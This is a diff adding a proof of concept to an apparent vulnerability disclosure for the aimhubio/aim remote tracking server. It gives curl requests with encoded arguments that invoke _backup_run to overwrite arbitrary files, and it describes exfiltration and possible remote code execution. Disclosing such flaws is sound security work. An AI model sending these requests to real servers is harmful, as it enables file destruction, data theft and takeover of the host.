@@ -1,7 +1,32 @@
 Title: Arbitrary file overwrite and arbitrary data exfiltration in aimhubio/aim
 
 Proof of Concept: 
+Run the remote tracking server (after following the standard Python install as described here) with a chosen repo by running
 
+aim init
+aim server --repo .
+
+Send the following requests to the tracking server:
+
+curl --location 'http://HOST_IP:53800/tracking/client_1/get-resource' \
+--header 'Content-Type: application/json' \
+--data '{
+"resource_handler": "my_resource",
+"resource_type": "Repo",
+"args": "AAAAAAABAAAABw=="
+}'
+
+This creates a repo-resource, and assigns the handler to client_1.
+
+curl --location 'http://HOST_IP:53800/tracking/client_1/read-instruction' \
+--header 'Content-Type: application/json' \
+--data '{
+"resource_handler": "my_resource",
+"method_name": "_backup_run",
+"args": "AAAAAAABAAAABgoAAAD+AAAAAAAAAAD+ABMAAAAEL2ZpbGUvdG8vb3ZlcndyaXRl"
+}'
+
+This calls the _backup_run function with the path-argument file/to/overwrite.
 
 Impact: 
 The presented vulnerabilities makes it possible for an attacker to remotely overwrite any file on the host server, and to exfiltrate any data from the host server. This can be abused to cause denial of service by overwriting critical system files, loss of private data, and (eventually) remote code execution by e.g. downloading private ssh-keys.
